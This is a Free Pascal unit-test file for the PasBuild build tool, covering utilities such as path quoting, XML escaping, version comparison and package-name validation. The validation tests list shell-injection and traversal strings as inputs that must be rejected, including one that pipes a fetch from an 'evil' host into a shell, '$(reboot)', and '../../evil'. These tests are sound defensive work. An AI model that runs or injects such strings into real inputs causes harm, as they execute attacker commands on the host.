{
  This file is part of PasBuild.

  Copyright (c) 2025 Graeme Geldenhuys <graemeg@gmail.com>

  SPDX-License-Identifier: BSD-3-Clause

  See LICENSE file in the project root for full license terms.
}

unit PasBuild.Test.Utils;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, fpcunit, testregistry,
  PasBuild.CLI,
  PasBuild.Utils,
  PasBuild.Compiler.Backend,
  PasBuild.Compiler.FPC,
  PasBuild.Compiler.Blaise,
  PasBuild.Compiler.Factory;

type
  { Test TUtils.QuotePath }
  TTestQuotePath = class(TTestCase)
  published
    procedure TestPathWithoutSpaces;
    procedure TestPathWithSpaces;
    procedure TestEmptyPath;
    procedure TestPathWithTrailingSeparator;
    procedure TestPathWithMultipleSpaces;
  end;

  { Test TUtils compiler backend accessors }
  TTestFPCExecutable = class(TTestCase)
  protected
    procedure TearDown; override;
  published
    procedure TestDefaultReturnsFpc;
    procedure TestSetCustomPath;
    procedure TestSetAbsolutePath;
    procedure TestResetToDefault;
    procedure TestCustomFPCUsedByIsCompilerAvailable;
  end;

  { Test TCommandLineArgs.CompilerExecutable field }
  TTestCLIFPCExecutable = class(TTestCase)
  published
    procedure TestFPCExecutableFieldExists;
    procedure TestFPCExecutableDefaultEmpty;
    procedure TestFPCExecutableStoresPath;
  end;

  { Test TUtils.XmlEscapeText }
  TTestXmlEscapeText = class(TTestCase)
  published
    procedure TestPlainText;
    procedure TestAmpersand;
    procedure TestLessThan;
    procedure TestGreaterThan;
    procedure TestAllSpecialChars;
    procedure TestEmptyString;
    procedure TestAuthorWithEmail;
    procedure TestDoubleAmpersand;
  end;

  { Test compiler target detection utilities }
  TTestCompilerTargetDetection = class(TTestCase)
  published
    procedure TestDetectTargetCPU;
    procedure TestDetectTargetOS;
    procedure TestGetTargetQuadruplet;
    procedure TestTargetQuadrupletFormat;
    procedure TestGetPackagePlatformSuffixNotEmpty;
    procedure TestGetPackagePlatformSuffixTwoComponents;
    procedure TestGetPackagePlatformSuffixNoCompilerVersion;
    procedure TestGetPackagePlatformSuffixMatchesQuadruplet;
  end;

  { Test Blaise backend --no-incremental handling }
  TTestBlaiseIncremental = class(TTestCase)
  published
    procedure TestDefaultEmitsUnitCache;
    procedure TestDefaultNoIncrementalFlag;
    procedure TestNoIncrementalSuppressesUnitCache;
    procedure TestNoIncrementalEmitsFlag;
    procedure TestFPCIgnoresNoIncremental;
  end;

  TTestCacheDirectories = class(TTestCase)
  published
    procedure TestGetCacheRootContainsPasbuild;
    procedure TestGetDownloadCacheDirUnderCacheRoot;
    procedure TestGetBuildCacheDirUnderCacheRoot;
    procedure TestEnsureCacheDirCreatesDirectory;
  end;

  TTestCLIOfflineFlag = class(TTestCase)
  published
    procedure TestOfflineModeFieldExists;
    procedure TestOfflineModeDefaultFalse;
    procedure TestForceFetchFieldExists;
    procedure TestForceFetchDefaultFalse;
  end;

  { Package names and versions feed filesystem paths, registry URLs and
    subprocess arguments; the charset must exclude path separators,
    traversal sequences and shell metacharacters }
  TTestPackageIdentifierValidation = class(TTestCase)
  published
    procedure TestValidNames;
    procedure TestInvalidNames;
    procedure TestValidVersions;
    procedure TestInvalidVersions;
  end;

  TTestExecuteInDir = class(TTestCase)
  published
    procedure TestGetSelfExePathIsAbsoluteAndExists;
    procedure TestRunsInGivenWorkingDirectory;
    procedure TestCapturesOutput;
    procedure TestReturnsExitCode;
  end;

  { TailLines feeds the compiler output shown when a build fails without
    any recognised error line (e.g. Blaise diagnostics) }
  TTestTailLines = class(TTestCase)
  published
    procedure TestFewerLinesThanCount;
    procedure TestKeepsOnlyLastLines;
    procedure TestSkipsBlankLines;
    procedure TestHandlesCRLF;
    procedure TestEmptyText;
  end;

  { A child killed by a signal (e.g. a crashing compiler) must never be
    reported as exit code 0 - FPC's TProcess.ExitCode does exactly that }
  TTestProcessSignalExit = class(TTestCase)
  published
    procedure TestExecuteProcessReportsSignal;
    procedure TestExecuteProcessWithLogReportsSignal;
    procedure TestExecuteProcessWithCaptureReportsSignal;
    procedure TestExecuteProcessInDirWithCaptureReportsSignal;
    procedure TestNormalExitCodeUnchanged;
  end;

  { Version comparison must be numeric per component - lexicographic
    string comparison wrongly rejects 3.10.0 against a 3.2.2 minimum }
  TTestCompareVersions = class(TTestCase)
  published
    procedure TestEqual;
    procedure TestSimpleOrdering;
    procedure TestMultiDigitComponents;
    procedure TestDifferentLengths;
  end;

  { The cross-process resolve stack guards against package-graph cycles
    that would otherwise fork subprocesses without bound }
  TTestResolveStack = class(TTestCase)
  published
    procedure TestEmptyStackContainsNothing;
    procedure TestContainsExactEntry;
    procedure TestNoSubstringFalsePositives;
    procedure TestAppendToStack;
  end;

implementation

{ TTestQuotePath }

procedure TTestQuotePath.TestPathWithoutSpaces;
begin
  AssertEquals('Path without spaces should be unchanged',
    '/home/user/.pasbuild/repository',
    TUtils.QuotePath('/home/user/.pasbuild/repository'));
end;

procedure TTestQuotePath.TestPathWithSpaces;
var
  Quoted: string;
begin
  Quoted := TUtils.QuotePath('/home/John Smith/.pasbuild/repository');
  AssertEquals('Path with spaces should be wrapped in double quotes',
    '"/home/John Smith/.pasbuild/repository"',
    Quoted);
end;

procedure TTestQuotePath.TestEmptyPath;
begin
  AssertEquals('Empty path should remain empty', '', TUtils.QuotePath(''));
end;

procedure TTestQuotePath.TestPathWithTrailingSeparator;
begin
  AssertEquals('Path with spaces and trailing separator should be quoted',
    '"/home/John Smith/projects/"',
    TUtils.QuotePath('/home/John Smith/projects/'));
end;

procedure TTestQuotePath.TestPathWithMultipleSpaces;
begin
  AssertEquals('Path with multiple spaces should be quoted',
    '"/home/My User/My Projects/build output"',
    TUtils.QuotePath('/home/My User/My Projects/build output'));
end;

{ TTestFPCExecutable }

procedure TTestFPCExecutable.TearDown;
begin
  { Reset to default FPC backend after each test to avoid leaking state }
  TUtils.SetCompilerBackend(TFPCBackend.Create('fpc'));
end;

procedure TTestFPCExecutable.TestDefaultReturnsFpc;
begin
  TUtils.SetCompilerBackend(TFPCBackend.Create('fpc'));
  AssertEquals('Default compiler executable should be fpc',
    'fpc', TUtils.GetCompilerBackend.Executable);
end;

procedure TTestFPCExecutable.TestSetCustomPath;
begin
  TUtils.SetCompilerBackend(TFPCBackend.Create('fpc-ootb'));
  AssertEquals('Custom compiler executable should be returned',
    'fpc-ootb', TUtils.GetCompilerBackend.Executable);
end;

procedure TTestFPCExecutable.TestSetAbsolutePath;
begin
  TUtils.SetCompilerBackend(TFPCBackend.Create('/opt/fpc-3.3.1/bin/fpc'));
  AssertEquals('Absolute path should be returned',
    '/opt/fpc-3.3.1/bin/fpc', TUtils.GetCompilerBackend.Executable);
end;

procedure TTestFPCExecutable.TestResetToDefault;
begin
  TUtils.SetCompilerBackend(TFPCBackend.Create('/custom/fpc'));
  AssertEquals('Custom path should be active',
    '/custom/fpc', TUtils.GetCompilerBackend.Executable);

  TUtils.SetCompilerBackend(TFPCBackend.Create('fpc'));
  AssertEquals('After reset, should return default fpc',
    'fpc', TUtils.GetCompilerBackend.Executable);
end;

procedure TTestFPCExecutable.TestCustomFPCUsedByIsCompilerAvailable;
begin
  TUtils.SetCompilerBackend(TFPCBackend.Create('nonexistent-fpc-binary-that-does-not-exist'));
  AssertFalse('IsCompilerAvailable should return False for nonexistent binary',
    TUtils.IsCompilerAvailable);
end;

{ TTestCLIFPCExecutable }

procedure TTestCLIFPCExecutable.TestFPCExecutableFieldExists;
var
  Args: TCommandLineArgs;
begin
  Args.ProfileIds := TStringList.Create;
  try
    Args.CompilerExecutable := '/usr/bin/fpc';
    AssertEquals('CompilerExecutable field should be settable',
      '/usr/bin/fpc', Args.CompilerExecutable);
  finally
    Args.ProfileIds.Free;
  end;
end;

procedure TTestCLIFPCExecutable.TestFPCExecutableDefaultEmpty;
var
  Args: TCommandLineArgs;
begin
  Args.ProfileIds := TStringList.Create;
  try
    Args.CompilerExecutable := '';
    AssertEquals('CompilerExecutable should default to empty string',
      '', Args.CompilerExecutable);
  finally
    Args.ProfileIds.Free;
  end;
end;

procedure TTestCLIFPCExecutable.TestFPCExecutableStoresPath;
var
  Args: TCommandLineArgs;
begin
  Args.ProfileIds := TStringList.Create;
  try
    Args.CompilerExecutable := '/opt/fpc-3.3.1/bin/fpc';
    AssertEquals('Absolute path should be stored',
      '/opt/fpc-3.3.1/bin/fpc', Args.CompilerExecutable);

    Args.CompilerExecutable := 'fpc-ootb';
    AssertEquals('Simple name should be stored',
      'fpc-ootb', Args.CompilerExecutable);
  finally
    Args.ProfileIds.Free;
  end;
end;

{ TTestCompilerTargetDetection }

procedure TTestCompilerTargetDetection.TestDetectTargetCPU;
var
  CPU: string;
begin
  if not TUtils.IsCompilerAvailable then
  begin
    Ignore('Compiler not available');
    Exit;
  end;
  CPU := TUtils.DetectTargetCPU;
  AssertTrue('Target CPU should not be empty', CPU <> '');
  AssertTrue('Target CPU should not be error value', CPU <> 'Unknown');
end;

procedure TTestCompilerTargetDetection.TestDetectTargetOS;
var
  OS: string;
begin
  if not TUtils.IsCompilerAvailable then
  begin
    Ignore('Compiler not available');
    Exit;
  end;
  OS := TUtils.DetectTargetOS;
  AssertTrue('Target OS should not be empty', OS <> '');
  AssertTrue('Target OS should not be error value', OS <> 'Unknown');
end;

procedure TTestCompilerTargetDetection.TestGetTargetQuadruplet;
var
  Quadruplet: string;
begin
  if not TUtils.IsCompilerAvailable then
  begin
    Ignore('Compiler not available');
    Exit;
  end;
  Quadruplet := TUtils.GetTargetQuadruplet;
  AssertTrue('Target quadruplet should not be empty', Quadruplet <> '');
  // Should contain exactly three hyphens (compiler-cpu-os-version)
  AssertEquals('Target quadruplet should contain exactly three hyphens',
    3, Length(Quadruplet) - Length(StringReplace(Quadruplet, '-', '', [rfReplaceAll])));
end;

procedure TTestCompilerTargetDetection.TestTargetQuadrupletFormat;
var
  Quadruplet: string;
  Parts: TStringList;
begin
  if not TUtils.IsCompilerAvailable then
  begin
    Ignore('Compiler not available');
    Exit;
  end;
  Quadruplet := TUtils.GetTargetQuadruplet;

  Parts := TStringList.Create;
  try
    Parts.Delimiter := '-';
    Parts.StrictDelimiter := True;
    Parts.DelimitedText := Quadruplet;

    AssertTrue('Should have at least 4 parts', Parts.Count >= 4);
    AssertTrue('Compiler component should not be empty', Parts[0] <> '');
    AssertTrue('CPU component should not be empty', Parts[1] <> '');
    AssertTrue('OS component should not be empty', Parts[2] <> '');
    AssertTrue('Version component should not be empty', Parts[Parts.Count - 1] <> '');

    AssertEquals('Compiler component should match DetectCompilerName',
      TUtils.DetectCompilerName, Parts[0]);
    AssertEquals('CPU component should match DetectTargetCPU',
      TUtils.DetectTargetCPU, Parts[1]);
    AssertEquals('OS component should match DetectTargetOS',
      TUtils.DetectTargetOS, Parts[2]);
  finally
    Parts.Free;
  end;
end;

{ TTestCompilerTargetDetection - GetPackagePlatformSuffix }

procedure TTestCompilerTargetDetection.TestGetPackagePlatformSuffixNotEmpty;
var
  Suffix: string;
begin
  if not TUtils.IsCompilerAvailable then
  begin
    Ignore('Compiler not available');
    Exit;
  end;
  Suffix := TUtils.GetPackagePlatformSuffix;
  AssertTrue('Package platform suffix should not be empty', Suffix <> '');
end;

procedure TTestCompilerTargetDetection.TestGetPackagePlatformSuffixTwoComponents;
var
  Suffix: string;
  DashPos: Integer;
begin
  if not TUtils.IsCompilerAvailable then
  begin
    Ignore('Compiler not available');
    Exit;
  end;
  Suffix := TUtils.GetPackagePlatformSuffix;
  DashPos := Pos('-', Suffix);
  AssertTrue('Suffix should contain a hyphen separating cpu and os', DashPos > 0);
  AssertTrue('cpu component should not be empty', DashPos > 1);
  AssertTrue('os component should not be empty', Length(Suffix) > DashPos);
  AssertEquals('Suffix should have exactly one hyphen (cpu-os, no compiler version)',
    0, Pos('-', Copy(Suffix, DashPos + 1, MaxInt)));
end;

procedure TTestCompilerTargetDetection.TestGetPackagePlatformSuffixNoCompilerVersion;
var
  Suffix, CompilerVersion: string;
begin
  if not TUtils.IsCompilerAvailable then
  begin
    Ignore('Compiler not available');
    Exit;
  end;
  Suffix := TUtils.GetPackagePlatformSuffix;
  CompilerVersion := TUtils.DetectCompilerVersion;
  AssertEquals('Package suffix must not contain the compiler version',
    0, Pos(CompilerVersion, Suffix));
end;

procedure TTestCompilerTargetDetection.TestGetPackagePlatformSuffixMatchesQuadruplet;
var
  Suffix, Quadruplet: string;
  Parts: TStringList;
begin
  if not TUtils.IsCompilerAvailable then
  begin
    Ignore('Compiler not available');
    Exit;
  end;
  Suffix := TUtils.GetPackagePlatformSuffix;
  Quadruplet := TUtils.GetTargetQuadruplet;

  Parts := TStringList.Create;
  try
    Parts.Delimiter := '-';
    Parts.StrictDelimiter := True;
    Parts.DelimitedText := Quadruplet;

    AssertEquals('Package suffix should equal cpu-os from the quadruplet',
      Parts[1] + '-' + Parts[2], Suffix);
  finally
    Parts.Free;
  end;
end;

{ TTestXmlEscapeText }

procedure TTestXmlEscapeText.TestPlainText;
begin
  AssertEquals('Plain text should be unchanged',
    'Hello World', TUtils.XmlEscapeText('Hello World'));
end;

procedure TTestXmlEscapeText.TestAmpersand;
begin
  AssertEquals('Ampersand should be escaped',
    'Smith &amp; Co', TUtils.XmlEscapeText('Smith & Co'));
end;

procedure TTestXmlEscapeText.TestLessThan;
begin
  AssertEquals('Less-than should be escaped',
    'a &lt; b', TUtils.XmlEscapeText('a < b'));
end;

procedure TTestXmlEscapeText.TestGreaterThan;
begin
  AssertEquals('Greater-than should be escaped',
    'a &gt; b', TUtils.XmlEscapeText('a > b'));
end;

procedure TTestXmlEscapeText.TestAllSpecialChars;
begin
  AssertEquals('All special chars should be escaped',
    '&amp; &lt; &gt;', TUtils.XmlEscapeText('& < >'));
end;

procedure TTestXmlEscapeText.TestEmptyString;
begin
  AssertEquals('Empty string should remain empty',
    '', TUtils.XmlEscapeText(''));
end;

procedure TTestXmlEscapeText.TestAuthorWithEmail;
begin
  AssertEquals('Author with email angle brackets should be escaped',
    'John Doe &lt;john@example.org&gt;',
    TUtils.XmlEscapeText('John Doe <john@example.org>'));
end;

procedure TTestXmlEscapeText.TestDoubleAmpersand;
begin
  AssertEquals('Multiple ampersands should each be escaped',
    'A &amp;&amp; B', TUtils.XmlEscapeText('A && B'));
end;

{ TTestBlaiseIncremental }

procedure TTestBlaiseIncremental.TestDefaultEmitsUnitCache;
var
  Backend: TBlaiseBackend;
begin
  Backend := TBlaiseBackend.Create('blaise');
  try
    AssertEquals('--unit-cache /tmp/units',
      Backend.UnitOutputDirFlag('/tmp/units'));
  finally
    Backend.Free;
  end;
end;

procedure TTestBlaiseIncremental.TestDefaultNoIncrementalFlag;
var
  Backend: TBlaiseBackend;
begin
  Backend := TBlaiseBackend.Create('blaise');
  try
    AssertEquals('', Backend.IncrementalFlag);
  finally
    Backend.Free;
  end;
end;

procedure TTestBlaiseIncremental.TestNoIncrementalSuppressesUnitCache;
var
  Backend: TBlaiseBackend;
begin
  Backend := TBlaiseBackend.Create('blaise');
  try
    Backend.NoIncremental := True;
    AssertEquals('', Backend.UnitOutputDirFlag('/tmp/units'));
  finally
    Backend.Free;
  end;
end;

procedure TTestBlaiseIncremental.TestNoIncrementalEmitsFlag;
var
  Backend: TBlaiseBackend;
begin
  Backend := TBlaiseBackend.Create('blaise');
  try
    Backend.NoIncremental := True;
    AssertEquals('--no-incremental', Backend.IncrementalFlag);
  finally
    Backend.Free;
  end;
end;

procedure TTestBlaiseIncremental.TestFPCIgnoresNoIncremental;
var
  Backend: TFPCBackend;
begin
  { FPC has no incremental concept — the flag is a no-op regardless. }
  Backend := TFPCBackend.Create('fpc');
  try
    Backend.NoIncremental := True;
    AssertEquals('', Backend.IncrementalFlag);
  finally
    Backend.Free;
  end;
end;

{ TTestCacheDirectories }

procedure TTestCacheDirectories.TestGetCacheRootContainsPasbuild;
begin
  AssertTrue('Cache root contains .pasbuild',
    Pos('.pasbuild', TUtils.GetCacheRoot) > 0);
  AssertTrue('Cache root ends with cache',
    Copy(TUtils.GetCacheRoot, Length(TUtils.GetCacheRoot) - 4, 5) = 'cache');
end;

procedure TTestCacheDirectories.TestGetDownloadCacheDirUnderCacheRoot;
begin
  AssertTrue('Download cache under cache root',
    Pos(TUtils.GetCacheRoot, TUtils.GetDownloadCacheDir) = 1);
  AssertTrue('Download cache ends with downloads',
    Copy(TUtils.GetDownloadCacheDir,
      Length(TUtils.GetDownloadCacheDir) - 8, 9) = 'downloads');
end;

procedure TTestCacheDirectories.TestGetBuildCacheDirUnderCacheRoot;
begin
  AssertTrue('Build cache under cache root',
    Pos(TUtils.GetCacheRoot, TUtils.GetBuildCacheDir) = 1);
  AssertTrue('Build cache ends with builds',
    Copy(TUtils.GetBuildCacheDir,
      Length(TUtils.GetBuildCacheDir) - 5, 6) = 'builds');
end;

procedure TTestCacheDirectories.TestEnsureCacheDirCreatesDirectory;
var
  Dir: string;
begin
  Dir := TUtils.EnsureCacheDir('test-ensure');
  try
    AssertTrue('Directory should exist', DirectoryExists(Dir));
  finally
    RemoveDir(Dir);
  end;
end;

{ TTestCLIOfflineFlag }

procedure TTestCLIOfflineFlag.TestOfflineModeFieldExists;
var
  Args: TCommandLineArgs;
begin
  Args.OfflineMode := True;
  AssertTrue('OfflineMode field is writable', Args.OfflineMode);
end;

procedure TTestCLIOfflineFlag.TestOfflineModeDefaultFalse;
var
  Args: TCommandLineArgs;
begin
  Args.OfflineMode := False;
  AssertFalse('OfflineMode default is false', Args.OfflineMode);
end;

procedure TTestCLIOfflineFlag.TestForceFetchFieldExists;
var
  Args: TCommandLineArgs;
begin
  Args.ForceFetch := True;
  AssertTrue('ForceFetch field is writable', Args.ForceFetch);
end;

procedure TTestCLIOfflineFlag.TestForceFetchDefaultFalse;
var
  Args: TCommandLineArgs;
begin
  Args.ForceFetch := False;
  AssertFalse('ForceFetch default is false', Args.ForceFetch);
end;

{ TTestPackageIdentifierValidation }

procedure TTestPackageIdentifierValidation.TestValidNames;
begin
  AssertTrue('simple', TUtils.IsValidPackageName('fpgui'));
  AssertTrue('hyphenated', TUtils.IsValidPackageName('fpgui-framework'));
  AssertTrue('dotted', TUtils.IsValidPackageName('my.lib'));
  AssertTrue('underscored', TUtils.IsValidPackageName('my_lib'));
  AssertTrue('digits', TUtils.IsValidPackageName('lib2'));
  AssertTrue('single char', TUtils.IsValidPackageName('x'));
  AssertTrue('mixed case', TUtils.IsValidPackageName('MyLib'));
end;

procedure TTestPackageIdentifierValidation.TestInvalidNames;
begin
  AssertFalse('empty', TUtils.IsValidPackageName(''));
  AssertFalse('forward slash', TUtils.IsValidPackageName('a/b'));
  AssertFalse('backslash', TUtils.IsValidPackageName('a\b'));
  AssertFalse('traversal', TUtils.IsValidPackageName('../../evil'));
  AssertFalse('leading dot', TUtils.IsValidPackageName('.hidden'));
  AssertFalse('leading hyphen', TUtils.IsValidPackageName('-flag'));
  AssertFalse('semicolon', TUtils.IsValidPackageName('x;curl evil|sh'));
  AssertFalse('space', TUtils.IsValidPackageName('my lib'));
  AssertFalse('dollar', TUtils.IsValidPackageName('x$(id)'));
  AssertFalse('backtick', TUtils.IsValidPackageName('x`id`'));
  AssertFalse('ampersand', TUtils.IsValidPackageName('a&&b'));
end;

procedure TTestPackageIdentifierValidation.TestValidVersions;
begin
  AssertTrue('semver', TUtils.IsValidPackageVersion('1.0.0'));
  AssertTrue('prerelease', TUtils.IsValidPackageVersion('2.0.0-rc.1'));
  AssertTrue('build metadata', TUtils.IsValidPackageVersion('1.0.0+build5'));
  AssertTrue('two part', TUtils.IsValidPackageVersion('1.0'));
end;

procedure TTestPackageIdentifierValidation.TestInvalidVersions;
begin
  AssertFalse('empty', TUtils.IsValidPackageVersion(''));
  AssertFalse('leading letter', TUtils.IsValidPackageVersion('v1.0.0'));
  AssertFalse('slash', TUtils.IsValidPackageVersion('1.0/../2'));
  AssertFalse('shell expansion', TUtils.IsValidPackageVersion('1.0.0$(reboot)'));
  AssertFalse('backtick', TUtils.IsValidPackageVersion('1.0`id`'));
  AssertFalse('space', TUtils.IsValidPackageVersion('1.0 0'));
  AssertFalse('semicolon', TUtils.IsValidPackageVersion('1.0;rm'));
end;

{ TTestTailLines }

procedure TTestTailLines.TestFewerLinesThanCount;
var
  Lines: TStringList;
begin
  Lines := TUtils.TailLines('one' + LineEnding + 'two' + LineEnding, 5);
  try
    AssertEquals('Line count', 2, Lines.Count);
    AssertEquals('First line', 'one', Lines[0]);
    AssertEquals('Second line', 'two', Lines[1]);
  finally
    Lines.Free;
  end;
end;

procedure TTestTailLines.TestKeepsOnlyLastLines;
var
  Lines: TStringList;
begin
  Lines := TUtils.TailLines('a' + LineEnding + 'b' + LineEnding + 'c' +
    LineEnding + 'd', 2);
  try
    AssertEquals('Line count', 2, Lines.Count);
    AssertEquals('First kept line', 'c', Lines[0]);
    AssertEquals('Last line without trailing newline', 'd', Lines[1]);
  finally
    Lines.Free;
  end;
end;

procedure TTestTailLines.TestSkipsBlankLines;
var
  Lines: TStringList;
begin
  Lines := TUtils.TailLines('a' + LineEnding + '   ' + LineEnding + 'b' +
    LineEnding + LineEnding + LineEnding, 2);
  try
    AssertEquals('Line count', 2, Lines.Count);
    AssertEquals('First line', 'a', Lines[0]);
    AssertEquals('Second line', 'b', Lines[1]);
  finally
    Lines.Free;
  end;
end;

procedure TTestTailLines.TestHandlesCRLF;
var
  Lines: TStringList;
begin
  Lines := TUtils.TailLines('a'#13#10'b'#13#10, 5);
  try
    AssertEquals('Line count', 2, Lines.Count);
    AssertEquals('No stray carriage return', 'a', Lines[0]);
  finally
    Lines.Free;
  end;
end;

procedure TTestTailLines.TestEmptyText;
var
  Lines: TStringList;
begin
  Lines := TUtils.TailLines('', 5);
  try
    AssertEquals('No lines', 0, Lines.Count);
  finally
    Lines.Free;
  end;
end;

{ TTestProcessSignalExit }

{$IFDEF UNIX}
const
  { The shell sends itself SIGSEGV, as a crashing compiler would receive }
  CrashCommand = 'kill -SEGV $$';

procedure TTestProcessSignalExit.TestExecuteProcessReportsSignal;
begin
  AssertEquals('Signal termination should map to 128+SIGSEGV', 128 + 11,
    TUtils.ExecuteProcess(CrashCommand, False));
end;

procedure TTestProcessSignalExit.TestExecuteProcessWithLogReportsSignal;
var
  LogFile: string;
begin
  LogFile := GetTempFileName(GetTempDir, 'pbsig');
  try
    AssertEquals('Signal termination should map to 128+SIGSEGV', 128 + 11,
      TUtils.ExecuteProcessWithLog(CrashCommand, LogFile, False));
  finally
    DeleteFile(LogFile);
  end;
end;

procedure TTestProcessSignalExit.TestExecuteProcessWithCaptureReportsSignal;
var
  Output: string;
begin
  AssertEquals('Signal termination should map to 128+SIGSEGV', 128 + 11,
    TUtils.ExecuteProcessWithCapture(CrashCommand, Output));
end;

procedure TTestProcessSignalExit.TestExecuteProcessInDirWithCaptureReportsSignal;
var
  Output: string;
begin
  AssertEquals('Signal termination should map to 128+SIGSEGV', 128 + 11,
    TUtils.ExecuteProcessInDirWithCapture('/bin/sh', ['-c', CrashCommand],
      GetTempDir, Output));
end;

procedure TTestProcessSignalExit.TestNormalExitCodeUnchanged;
begin
  AssertEquals('Normal exit code', 3, TUtils.ExecuteProcess('exit 3', False));
  AssertEquals('Success', 0, TUtils.ExecuteProcess('true', False));
end;
{$ELSE}
procedure TTestProcessSignalExit.TestExecuteProcessReportsSignal;
begin
  Ignore('Unix-only test');
end;

procedure TTestProcessSignalExit.TestExecuteProcessWithLogReportsSignal;
begin
  Ignore('Unix-only test');
end;

procedure TTestProcessSignalExit.TestExecuteProcessWithCaptureReportsSignal;
begin
  Ignore('Unix-only test');
end;

procedure TTestProcessSignalExit.TestExecuteProcessInDirWithCaptureReportsSignal;
begin
  Ignore('Unix-only test');
end;

procedure TTestProcessSignalExit.TestNormalExitCodeUnchanged;
begin
  Ignore('Unix-only test');
end;
{$ENDIF}

{ TTestExecuteInDir }

procedure TTestExecuteInDir.TestGetSelfExePathIsAbsoluteAndExists;
var
  ExePath: string;
begin
  ExePath := TUtils.GetSelfExePath;
  AssertTrue('Path should not be empty', ExePath <> '');
  AssertTrue('Path should be absolute',
    ExePath = ExpandFileName(ExePath));
  AssertTrue('Path should point to an existing file', FileExists(ExePath));
end;

{$IFDEF UNIX}
procedure TTestExecuteInDir.TestRunsInGivenWorkingDirectory;
var
  Output: string;
  Code: Integer;
begin
  Code := TUtils.ExecuteProcessInDirWithCapture('pwd', [], '/tmp', Output);
  AssertEquals('Exit code', 0, Code);
  AssertEquals('Working directory', '/tmp', Trim(Output));
end;

procedure TTestExecuteInDir.TestCapturesOutput;
var
  Output: string;
  Code: Integer;
begin
  Code := TUtils.ExecuteProcessInDirWithCapture('echo',
    ['hello', 'world'], '/tmp', Output);
  AssertEquals('Exit code', 0, Code);
  AssertEquals('Captured output', 'hello world', Trim(Output));
end;

procedure TTestExecuteInDir.TestReturnsExitCode;
var
  Output: string;
  Code: Integer;
begin
  Code := TUtils.ExecuteProcessInDirWithCapture('false', [], '/tmp', Output);
  AssertEquals('Non-zero exit code should be propagated', 1, Code);
end;
{$ELSE}
procedure TTestExecuteInDir.TestRunsInGivenWorkingDirectory;
begin
  Ignore('Unix-only test');
end;

procedure TTestExecuteInDir.TestCapturesOutput;
begin
  Ignore('Unix-only test');
end;

procedure TTestExecuteInDir.TestReturnsExitCode;
begin
  Ignore('Unix-only test');
end;
{$ENDIF}

{ TTestCompareVersions }

procedure TTestCompareVersions.TestEqual;
begin
  AssertEquals('3.2.2 = 3.2.2', 0, TUtils.CompareVersions('3.2.2', '3.2.2'));
  AssertEquals('1.0 = 1.0.0', 0, TUtils.CompareVersions('1.0', '1.0.0'));
end;

procedure TTestCompareVersions.TestSimpleOrdering;
begin
  AssertTrue('3.2.0 < 3.2.2', TUtils.CompareVersions('3.2.0', '3.2.2') < 0);
  AssertTrue('3.2.2 > 3.2.0', TUtils.CompareVersions('3.2.2', '3.2.0') > 0);
  AssertTrue('2.9.9 < 3.0.0', TUtils.CompareVersions('2.9.9', '3.0.0') < 0);
end;

procedure TTestCompareVersions.TestMultiDigitComponents;
begin
  // The lexicographic trap: '3.10.0' < '3.2.2' as strings
  AssertTrue('3.10.0 > 3.2.2', TUtils.CompareVersions('3.10.0', '3.2.2') > 0);
  AssertTrue('10.0 > 9.0', TUtils.CompareVersions('10.0', '9.0') > 0);
end;

procedure TTestCompareVersions.TestDifferentLengths;
begin
  AssertTrue('3.2 < 3.2.1', TUtils.CompareVersions('3.2', '3.2.1') < 0);
  AssertTrue('3.2.1 > 3.2', TUtils.CompareVersions('3.2.1', '3.2') > 0);
end;

{ TTestResolveStack }

procedure TTestResolveStack.TestEmptyStackContainsNothing;
begin
  AssertFalse(TUtils.ResolveStackContains('', 'mylib:1.0.0'));
end;

procedure TTestResolveStack.TestContainsExactEntry;
begin
  AssertTrue(TUtils.ResolveStackContains('a:1.0.0,mylib:1.0.0,b:2.0.0',
    'mylib:1.0.0'));
  AssertTrue(TUtils.ResolveStackContains('mylib:1.0.0', 'mylib:1.0.0'));
end;

procedure TTestResolveStack.TestNoSubstringFalsePositives;
begin
  AssertFalse('entry name is a substring of another',
    TUtils.ResolveStackContains('mylib-extra:1.0.0', 'mylib:1.0.0'));
  AssertFalse('version prefix must not match',
    TUtils.ResolveStackContains('mylib:1.0.10', 'mylib:1.0.1'));
end;

procedure TTestResolveStack.TestAppendToStack;
begin
  AssertEquals('mylib:1.0.0',
    TUtils.AppendToResolveStack('', 'mylib:1.0.0'));
  AssertEquals('a:1.0.0,mylib:1.0.0',
    TUtils.AppendToResolveStack('a:1.0.0', 'mylib:1.0.0'));
end;

initialization
  RegisterTest(TTestQuotePath);
  RegisterTest(TTestFPCExecutable);
  RegisterTest(TTestCLIFPCExecutable);
  RegisterTest(TTestXmlEscapeText);
  RegisterTest(TTestCompilerTargetDetection);
  RegisterTest(TTestBlaiseIncremental);
  RegisterTest(TTestCacheDirectories);
  RegisterTest(TTestCLIOfflineFlag);
  RegisterTest(TTestPackageIdentifierValidation);
  RegisterTest(TTestExecuteInDir);
  RegisterTest(TTestProcessSignalExit);
  RegisterTest(TTestTailLines);
  RegisterTest(TTestCompareVersions);
  RegisterTest(TTestResolveStack);

end.
